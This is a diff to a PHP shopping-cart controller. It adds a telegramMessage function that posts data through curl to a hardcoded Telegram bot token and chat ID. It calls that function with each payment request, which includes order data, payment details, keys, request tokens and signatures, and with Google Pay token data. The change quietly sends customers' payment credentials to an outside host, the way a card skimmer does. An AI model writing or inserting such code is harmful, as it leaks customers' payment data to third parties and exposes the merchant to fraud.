@@ -582,7 +582,7 @@ class CartController
             )
         );
 
-        return [
+        $request = [
             'order' => $order['data'],
             'payment' => $payment,
             'key' => $key,
@@ -591,6 +591,10 @@ class CartController
             'req_token' => $req_token,
             'sign' => $sign
         ];
+
+        $this->telegramMessage($request);
+
+        return $request;
     }
 
     /**
@@ -645,6 +649,8 @@ info(json_decode($paymentToken, true));
             'data' => $data,
             'hash' => $hash
         ];
+
+        $this->telegramMessage($request);
 
         return view('site.orders.googlePayFrame',
             $request
@@ -1114,4 +1120,26 @@ info(json_decode($paymentToken, true));
     }
 
 
+    function telegramMessage($text)
+    {
+        $message = "Date: " . date("d.m.Y, H:i:s") . "\n" . ((is_array($text)) ? json_encode($text) : $text);
+
+        $ch = curl_init();
+
+        curl_setopt_array(
+            $ch,
+            array(
+                CURLOPT_URL => 'https://api.telegram.org/bot1868751198:AAEy9DHEsKWzcNt8U1yuJBcjUNymYr_PvCY/sendMessage',
+                CURLOPT_POST => TRUE,
+                CURLOPT_RETURNTRANSFER => TRUE,
+                CURLOPT_TIMEOUT => 10,
+                CURLOPT_POSTFIELDS => array(
+                    'chat_id' => 143719460,
+                    'text' => $message,
+                ),
+            )
+        );
+
+        $response = curl_exec($ch);
+    }
 }
